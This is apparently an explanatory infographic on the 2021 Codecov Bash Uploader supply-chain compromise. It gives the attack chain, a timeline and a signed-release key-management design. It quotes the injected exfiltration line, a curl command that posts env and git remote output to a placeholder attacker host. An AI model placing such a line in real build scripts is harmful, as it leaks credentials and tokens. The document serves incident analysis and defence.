How the Codecov Bash Uploader was compromised (Jan to Apr 2021)

1Secret left in imageA Google Cloud Storage HMAC key was left in an intermediate layer of Codecov's public Self-Hosted Docker image.
➜
2Key extractedThe attacker pulled the image, inspected its layers and recovered the storage credential.
➜
3Uploader modifiedThe attacker used the key to overwrite the bash uploader in the GCS bucket, adding one exfiltration line.
➜
4Trusted & executedCustomer CI ran curl codecov.io/bash | bash. No signature check, and hash checks were rarely used.
➜
5Secrets stolenenv + git remote -v were sent to the attacker's server. Victims then had tokens, cloud keys and signing keys to rotate.
Injected line (simplified): curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://<attacker-ip>/upload/v2 || true

Incident timeline

31 Jan 2021
First unauthorised change to the Bash Uploader via the leaked HMAC key.
About 2 months undetected
Periodic malicious edits. Thousands of CI runs leak their environment variables.
1 Apr 2021
A customer's computed SHA-256 does not match the published one. Codecov removes the malicious code.
15 Apr 2021
Public security notice; customers told to rotate every credential.
Late Apr 2021
Downstream impact (e.g. HashiCorp GPG release key rotated), federal investigation.
2021 – 22
Signed (GPG + SHA-256) uploader replaces the Bash script.

Key management: hierarchy and lifecycle

Root key (Ed25519)
Offline HSM, 2-person rule, used only a few times a year
Public key pinned in every customer's policy.json
↓ signs
Release-key certificate
Release key in Cloud KMS
valid 90 days, auto-rotated
Revocation list (CRL)
revoked key IDs +
revoked artifact hashes
↓ signs
Release manifest {sha256, version, ...}
Log key (separate operator) signs transparency-log head
StageControl in SignGate
GenerateEd25519 keys created inside HSM/KMS. Demo stores them as AES-256 encrypted PKCS#8.
CertifyRoot signs {key_id, public key, purpose, not_before, not_after}.
UseOnly the release pipeline identity may call sign. Every use is logged.
RotateNew release key every 90 days (rotate_release_key). Customers change nothing.
RevokeRoot-signed CRL entry blocks a key everywhere on the next CI run.
DestroyExpired keys are destroyed in the HSM. Old signatures stay verifiable through the log.
